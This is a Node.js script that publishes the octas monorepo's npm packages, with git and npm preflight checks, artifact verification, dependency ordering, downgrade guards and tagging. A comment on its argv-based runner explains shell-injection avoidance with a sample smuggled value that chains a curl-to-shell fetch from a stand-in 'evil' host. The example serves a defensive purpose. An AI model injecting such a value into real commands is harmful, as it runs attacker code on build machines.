#!/usr/bin/env node
/**
 * Publish the octas + @octas/* packages to npm from a clean local checkout.
 *
 *   node scripts/publish.mjs                   # full run — preflight, build, confirm, publish
 *   node scripts/publish.mjs --dry-run         # print plan, do nothing
 *   node scripts/publish.mjs --skip-build      # assume dist/ already fresh
 *   node scripts/publish.mjs --skip-checks     # skip git-clean + on-main checks
 *   node scripts/publish.mjs --allow-downgrade # permit publishing an older version than the registry
 *   node scripts/publish.mjs --otp=123456      # pass OTP to each publish (good for ~5min)
 *   node scripts/publish.mjs --tag             # also create v<core-version> git tag
 *   node scripts/publish.mjs --tag --push-tag  # …and push the tag to origin
 *   node scripts/publish.mjs --yes             # skip the interactive confirmation
 *
 * Exits non-zero on the first failure; already-published packages are
 * skipped (not treated as errors), so reruns after a partial failure
 * are safe.
 */

import { execSync, spawnSync } from 'node:child_process';
import { existsSync, readFileSync, readdirSync, statSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import readline from 'node:readline';
import { classifyBump } from './version-bump.mjs';

const ROOT = resolve(fileURLToPath(import.meta.url), '..', '..');
const PACKAGES_DIR = join(ROOT, 'packages');

const args = process.argv.slice(2);
const argSet = new Set(args);
const DRY_RUN = argSet.has('--dry-run') || argSet.has('-n');
const SKIP_BUILD = argSet.has('--skip-build');
const SKIP_CHECKS = argSet.has('--skip-checks') || argSet.has('-f');
const ALLOW_DOWNGRADE = argSet.has('--allow-downgrade');
const MAKE_TAG = argSet.has('--tag');
const PUSH_TAG = argSet.has('--push-tag');
const SKIP_CONFIRM = argSet.has('--yes') || argSet.has('-y');
const OTP = (() => {
  const arg = args.find((a) => a.startsWith('--otp='));
  return arg ? arg.slice('--otp='.length) : null;
})();

const COLORS = {
  dim: '\x1b[2m',
  bold: '\x1b[1m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  reset: '\x1b[0m',
};

function log(msg) {
  process.stdout.write(`${msg}\n`);
}
function header(msg) {
  log(`${COLORS.bold}${COLORS.blue}▸ ${msg}${COLORS.reset}`);
}
function success(msg) {
  log(`${COLORS.green}✓${COLORS.reset} ${msg}`);
}
function warn(msg) {
  log(`${COLORS.yellow}! ${msg}${COLORS.reset}`);
}
function fail(msg) {
  log(`${COLORS.red}✗ ${msg}${COLORS.reset}`);
}
function dim(msg) {
  return `${COLORS.dim}${msg}${COLORS.reset}`;
}

function run(cmd, opts = {}) {
  return execSync(cmd, { stdio: 'pipe', encoding: 'utf8', ...opts }).trim();
}

/**
 * Like {@link run}, but argv form (no shell). Use this for any command that
 * interpolates a value — a tag name, a package name — that must never be
 * parsed by a shell. A version string like `1.0.0 && curl evil | sh` reaches
 * `git`/`npm` as a single inert argument here rather than as shell syntax.
 * Throws on a non-zero exit, mirroring `run`'s throw-on-error contract.
 */
function runArgv(file, argv, opts = {}) {
  const r = spawnSync(file, argv, { stdio: 'pipe', encoding: 'utf8', ...opts });
  if (r.error) throw r.error;
  if (r.status !== 0) {
    const detail = `${r.stderr ?? ''}${r.stdout ?? ''}`.trim();
    throw new Error(detail || `${file} exited with ${r.status}`);
  }
  return (r.stdout ?? '').trim();
}

/** Read and parse a workspace package.json, or return null if unreadable. */
function readPkg(pkgPath) {
  try {
    return JSON.parse(readFileSync(pkgPath, 'utf8'));
  } catch {
    return null;
  }
}

/** Every directory under packages/ that carries a parseable manifest. */
function eachWorkspacePackage() {
  const out = [];
  for (const name of readdirSync(PACKAGES_DIR)) {
    const dir = join(PACKAGES_DIR, name);
    if (!statSync(dir).isDirectory()) continue;
    const pkgPath = join(dir, 'package.json');
    const pkg = readPkg(pkgPath);
    if (pkg === null) continue;
    out.push({ pkg, dir, pkgPath });
  }
  return out;
}

function findPublishablePackages() {
  const out = [];
  for (const { pkg, dir, pkgPath } of eachWorkspacePackage()) {
    if (pkg.private) continue;
    // Publishable surface: every `@octas/*` workspace plus the unscoped
    // `octas` meta package, which re-exports all of them.
    if (pkg.name !== 'octas' && !pkg.name?.startsWith('@octas/')) continue;
    out.push({ name: pkg.name, version: pkg.version, dir, pkgPath, pkg });
  }
  return sortByDependencyOrder(out);
}

/**
 * Order packages so every package ships after the workspace siblings it
 * depends on. npm does not verify that a dependency exists at publish
 * time, so a name-sorted run would happily push `@octas/core@x` minutes
 * before the `@octas/utils@x` it pins — leaving a window where installing
 * core resolves a version of utils that is not on the registry yet.
 * Kahn's algorithm over the intra-workspace edges closes that window;
 * ties break on name so runs stay deterministic. A dependency cycle (not
 * currently possible here, but cheap to survive) degrades to name order
 * for the packages still tangled in it rather than dropping them.
 */
function sortByDependencyOrder(packages) {
  const byName = new Map(packages.map((p) => [p.name, p]));
  const deps = new Map(
    packages.map((p) => {
      const edges = new Set();
      for (const block of ['dependencies', 'peerDependencies']) {
        for (const dep of Object.keys(p.pkg[block] ?? {})) {
          if (byName.has(dep) && dep !== p.name) edges.add(dep);
        }
      }
      return [p.name, edges];
    }),
  );

  const ordered = [];
  const remaining = new Set(byName.keys());
  while (remaining.size > 0) {
    const ready = [...remaining]
      .filter((name) => [...deps.get(name)].every((d) => !remaining.has(d)))
      .sort();
    // Cycle: nothing is unblocked. Emit what's left in name order so the
    // run still publishes rather than spinning forever.
    if (ready.length === 0) {
      for (const name of [...remaining].sort()) ordered.push(byName.get(name));
      break;
    }
    for (const name of ready) {
      ordered.push(byName.get(name));
      remaining.delete(name);
    }
  }
  return ordered;
}

/** Sentinel: the package is genuinely not published yet (npm 404). */
const NOT_PUBLISHED = Symbol('not-published');

/**
 * Returns the latest published version string, or {@link NOT_PUBLISHED}
 * when the registry confirms the package does not exist (404).
 *
 * Throws on any *ambiguous* failure (network, auth, registry outage), so a
 * transient blip can't be mistaken for "new package" and defeat the
 * idempotent-skip guarantee the header comment promises. We must
 * distinguish "definitely not there" from "couldn't tell" and abort on the
 * latter.
 */
function npmView(name) {
  // argv form (no shell): the package name is never parsed by a shell, and we
  // distinguish a genuine 404 from an ambiguous failure via the exit result.
  const r = spawnSync('npm', ['view', name, 'version'], {
    stdio: ['ignore', 'pipe', 'pipe'],
    encoding: 'utf8',
  });
  if (r.error) {
    throw new Error(`npm view ${name} could not run: ${r.error.message}`);
  }
  if (r.status === 0) return (r.stdout ?? '').trim();
  const detail = `${r.stderr ?? ''}${r.stdout ?? ''}`;
  if (/E404|404 Not Found|is not in (this|the) registry|code E404/i.test(detail)) {
    return NOT_PUBLISHED;
  }
  throw new Error(
    `npm view ${name} failed and it was not a 404 — refusing to treat it as a new ` +
      `package (that could republish existing versions). Original error:\n${detail.trim() || `exit ${r.status}`}`,
  );
}

/**
 * Build a Map of workspace package name → current local version.
 * Includes every package under packages/, not just publishable ones,
 * so a published package depending on a private workspace sibling
 * (rare, but legal) still gets resolved.
 */
function buildVersionMap() {
  const map = new Map();
  for (const { pkg } of eachWorkspacePackage()) {
    if (pkg.name && pkg.version) map.set(pkg.name, pkg.version);
  }
  return map;
}

/**
 * Resolve a single workspace-protocol range to a concrete semver range
 * that npm understands. Mirrors pnpm's published-manifest rewrite:
 *
 *   workspace:*           → "1.2.3"
 *   workspace:^           → "^1.2.3"
 *   workspace:~           → "~1.2.3"
 *   workspace:^1.0.0      → "^1.0.0"  (already explicit, just strip)
 */
function resolveWorkspaceProtocol(range, depName, versionMap) {
  const target = versionMap.get(depName);
  if (target === undefined) {
    throw new Error(
      `Workspace dep "${depName}" (range "${range}") has no matching package in the workspace`,
    );
  }
  const suffix = range.slice('workspace:'.length);
  if (suffix === '*' || suffix === '') return target;
  if (suffix === '^') return `^${target}`;
  if (suffix === '~') return `~${target}`;
  return suffix;
}

/**
 * Rewrite a parsed package.json's `dependencies`, `devDependencies`,
 * and `peerDependencies` blocks so all `workspace:*` ranges become
 * concrete versions. Returns the original object unchanged if no
 * workspace deps were found, so callers can use referential equality
 * to skip the file-write round-trip.
 */
function rewriteWorkspaceDeps(pkg, versionMap) {
  let result = pkg;
  for (const block of ['dependencies', 'devDependencies', 'peerDependencies']) {
    const deps = pkg[block];
    if (!deps) continue;
    let newDeps = deps;
    for (const [name, range] of Object.entries(deps)) {
      if (typeof range !== 'string' || !range.startsWith('workspace:')) continue;
      if (newDeps === deps) newDeps = { ...deps };
      newDeps[name] = resolveWorkspaceProtocol(range, name, versionMap);
    }
    if (newDeps !== deps) {
      if (result === pkg) result = { ...pkg };
      result[block] = newDeps;
    }
  }
  return result;
}

function preflight() {
  header('Preflight');

  if (!SKIP_CHECKS) {
    const branch = run('git rev-parse --abbrev-ref HEAD');
    if (branch !== 'main') {
      fail(`Not on main (currently on '${branch}'). Pass --skip-checks to override.`);
      process.exit(1);
    }
    success(`On branch main`);

    const dirty = run('git status --porcelain');
    if (dirty) {
      fail(
        `Working tree is dirty:\n${dirty}\nCommit or stash before publishing. Pass --skip-checks to override.`,
      );
      process.exit(1);
    }
    success('Working tree is clean');

    const aheadBehind = run('git rev-list --left-right --count origin/main...HEAD').split('\t');
    const [behind, ahead] = aheadBehind.map((n) => Number.parseInt(n, 10));
    if (ahead > 0) {
      warn(
        `You are ${ahead} commit(s) ahead of origin/main — these are being published without being pushed.`,
      );
    }
    if (behind > 0) {
      fail(`You are ${behind} commit(s) behind origin/main. Pull first.`);
      process.exit(1);
    }
  } else {
    warn('Skipping git-clean + on-main checks (--skip-checks)');
  }

  try {
    const who = run('npm whoami');
    success(`Logged in to npm as ${COLORS.bold}${who}${COLORS.reset}`);
  } catch {
    fail('Not logged in to npm. Run `npm login` first, or set NPM_TOKEN in your env.');
    process.exit(1);
  }

  if (OTP !== null) {
    success(`OTP supplied (will be passed to each npm publish)`);
  } else {
    log(
      dim(
        '  No --otp= passed; npm will prompt interactively per package if 2FA is required for publish.',
      ),
    );
  }
}

function build() {
  if (SKIP_BUILD) {
    warn('Skipping build (--skip-build) — assuming dist/ is fresh');
    return;
  }
  header('Building packages');
  const r = spawnSync('pnpm', ['build'], { stdio: 'inherit', cwd: ROOT });
  if (r.status !== 0) {
    fail('Build failed.');
    process.exit(r.status ?? 1);
  }
  success('Build succeeded');
}

/**
 * Every package ships `"files": ["dist"]`, so an empty or missing dist/
 * produces a tarball with no code in it — npm accepts that happily and
 * the breakage only surfaces at install time. A green build is not proof
 * the artifacts exist either: turbo restores a cache hit from its
 * `outputs` globs, so a task whose outputs are misdeclared can "succeed"
 * having written nothing. Verify the artifacts directly.
 */
function verifyArtifacts(packages) {
  header('Verifying build artifacts');
  const broken = [];
  for (const p of packages) {
    const distDir = join(p.dir, 'dist');
    if (!existsSync(distDir) || !statSync(distDir).isDirectory()) {
      broken.push(`${p.name}: no dist/ directory`);
      continue;
    }
    if (readdirSync(distDir).length === 0) {
      broken.push(`${p.name}: dist/ is empty`);
    }
  }
  if (broken.length > 0) {
    fail(
      `Refusing to publish — build artifacts are missing:\n  ${broken.join('\n  ')}\n` +
        `Run \`pnpm build\` and check that turbo's \`outputs\` in turbo.json covers "dist/**".`,
    );
    process.exit(1);
  }
  success(`dist/ present for all ${packages.length} package(s)`);
}

function plan(packages) {
  header('Publish plan');
  const rows = packages.map((p) => {
    // npmView throws on ambiguous failures — that intentionally aborts the
    // whole run via main().catch rather than silently publishing.
    const viewed = npmView(p.name);
    const isNew = viewed === NOT_PUBLISHED;
    // Normalise the sentinel back to null so the toPublish/skipped filters
    // below keep working (`null !== version` ⇒ publish).
    const published = isNew ? null : viewed;
    // Classify the registry → local jump per package. A bare
    // `published !== version` would be enough to publish, with no guard
    // against local < published: a stale checkout (local 0.0.2, registry
    // 0.0.4, never re-published) would publish and re-point `latest` to
    // the older release.
    const bump = isNew ? 'new' : classifyBump(published, p.version);
    const statusColor =
      bump === 'downgrade' || bump === 'unknown'
        ? COLORS.red
        : bump === 'no-op'
          ? COLORS.dim
          : COLORS.green;
    const statusText = isNew
      ? 'new'
      : bump === 'no-op'
        ? 'already published'
        : bump === 'unknown'
          ? `unparseable (${published} → ${p.version})`
          : bump === 'downgrade'
            ? `DOWNGRADE ${published} → ${p.version}`
            : `${published} → ${p.version}`;
    const status = `${statusColor}${statusText}${COLORS.reset}`;
    return { ...p, published, bump, status };
  });
  const nameWidth = Math.max(...rows.map((r) => r.name.length));
  for (const r of rows) {
    log(`  ${r.name.padEnd(nameWidth)}  ${r.status}`);
  }

  // Fail closed on version-sanity violations before anything is published.
  // Unparseable versions are always fatal (a malformed manifest must never
  // ship). Downgrades are fatal too, but overridable with --allow-downgrade
  // for the rare deliberate re-point. --skip-checks deliberately does NOT
  // cover these: it bypasses git hygiene, not registry-clobbering safety.
  const unknowns = rows.filter((r) => r.bump === 'unknown');
  if (unknowns.length > 0) {
    fail(
      `Unparseable version on: ${unknowns.map((r) => r.name).join(', ')}. ` +
        `Fix the package.json version(s) before publishing.`,
    );
    process.exit(1);
  }
  const downgrades = rows.filter((r) => r.bump === 'downgrade');
  if (downgrades.length > 0) {
    const detail = downgrades.map((r) => `${r.name} (${r.published} → ${r.version})`).join(', ');
    if (ALLOW_DOWNGRADE) {
      warn(`Publishing a downgrade (--allow-downgrade): ${detail}`);
    } else {
      fail(
        `Local version is older than the registry for: ${detail}. ` +
          `This would re-point npm 'latest' to an older release. ` +
          `Pull the latest tags, or pass --allow-downgrade if this is intentional.`,
      );
      process.exit(1);
    }
  }

  const toPublish = rows.filter((r) => r.published !== r.version);
  const skipped = rows.filter((r) => r.published === r.version);
  if (skipped.length > 0) {
    log(dim(`  (${skipped.length} already at target version — will be skipped)`));
  }
  return { rows, toPublish, skipped };
}

async function confirm(message) {
  if (SKIP_CONFIRM || DRY_RUN) return true;
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((res) => {
    rl.question(`${message} [y/N] `, (ans) => {
      rl.close();
      res(ans.trim().toLowerCase().startsWith('y'));
    });
  });
}

function publishOne(pkg, versionMap) {
  const label = `${pkg.name}@${pkg.version}`;
  if (DRY_RUN) {
    log(`  ${dim('[dry-run]')} would publish ${label}`);
    return { ok: true, pkg, skipped: false };
  }

  // pnpm stores cross-package deps as `workspace:*`; raw `npm publish`
  // ships those strings verbatim and bricks every install with
  // EUNSUPPORTEDPROTOCOL. Rewrite to concrete versions in-place, run the
  // publish, then restore the original file content (regardless of
  // success/failure) so the working tree stays clean.
  const originalContent = readFileSync(pkg.pkgPath, 'utf8');
  // rewriteWorkspaceDeps returns the *same* object reference when there are
  // no workspace: deps to rewrite, so an identity check tells us whether a
  // rewrite is actually needed — compare against the same parsed object we
  // passed in, not a second parse.
  const parsed = JSON.parse(originalContent);
  const rewritten = rewriteWorkspaceDeps(parsed, versionMap);
  const needsRewrite = rewritten !== parsed;

  let r;
  try {
    if (needsRewrite) {
      writeFileSync(pkg.pkgPath, `${JSON.stringify(rewritten, null, 2)}\n`, 'utf8');
    }
    const npmArgs = ['publish', '--access', 'public'];
    if (OTP !== null) npmArgs.push(`--otp=${OTP}`);
    r = spawnSync('npm', npmArgs, {
      cwd: pkg.dir,
      stdio: 'inherit',
    });
  } finally {
    if (needsRewrite) {
      writeFileSync(pkg.pkgPath, originalContent, 'utf8');
    }
  }

  if (r.status === 0) {
    success(`Published ${label}`);
    return { ok: true, pkg, skipped: false };
  }
  fail(`Failed to publish ${label} (exit ${r.status})`);
  return { ok: false, pkg, skipped: false };
}

function maybeTag(packages) {
  if (!MAKE_TAG) return;
  const core = packages.find((p) => p.name === '@octas/core');
  if (!core) {
    warn('No @octas/core found — skipping tag');
    return;
  }
  const tagName = `v${core.version}`;
  header(`Tagging ${tagName}`);
  if (DRY_RUN) {
    log(`  ${dim('[dry-run]')} would run: git tag ${tagName}`);
    if (PUSH_TAG) log(`  ${dim('[dry-run]')} would run: git push origin ${tagName}`);
    return;
  }
  try {
    runArgv('git', ['tag', tagName]);
    success(`Created tag ${tagName}`);
  } catch (err) {
    fail(`Failed to create tag ${tagName}: ${err.message}`);
    return;
  }
  if (PUSH_TAG) {
    try {
      runArgv('git', ['push', 'origin', tagName]);
      success(`Pushed tag ${tagName} to origin`);
    } catch (err) {
      fail(`Failed to push tag: ${err.message}`);
    }
  } else {
    log(dim(`  push manually with: git push origin ${tagName}`));
  }
}

async function main() {
  const packages = findPublishablePackages();
  if (packages.length === 0) {
    fail('No publishable octas / @octas/* packages found under packages/');
    process.exit(1);
  }

  preflight();
  build();
  verifyArtifacts(packages);
  const { toPublish } = plan(packages);

  if (toPublish.length === 0) {
    success('Nothing to publish — every package is already at its target version.');
    return;
  }

  const ok = await confirm(
    DRY_RUN
      ? 'Dry-run — print the publish plan only?'
      : `Publish ${toPublish.length} package(s) to https://registry.npmjs.org now?`,
  );
  if (!ok) {
    warn('Aborted by user.');
    process.exit(1);
  }

  header('Publishing');
  const versionMap = buildVersionMap();
  const results = toPublish.map((pkg) => publishOne(pkg, versionMap));

  const failures = results.filter((r) => !r.ok);
  log('');
  header('Summary');
  for (const r of results) {
    const prefix = r.ok ? `${COLORS.green}✓${COLORS.reset}` : `${COLORS.red}✗${COLORS.reset}`;
    log(`  ${prefix} ${r.pkg.name}@${r.pkg.version}`);
  }

  if (failures.length > 0) {
    fail(`${failures.length} package(s) failed to publish.`);
    process.exit(1);
  }

  maybeTag(packages);

  success(`Done — ${results.length} package(s) published${MAKE_TAG ? ' + tagged' : ''}.`);
}

main().catch((err) => {
  fail(err.stack ?? err.message ?? String(err));
  process.exit(1);
});
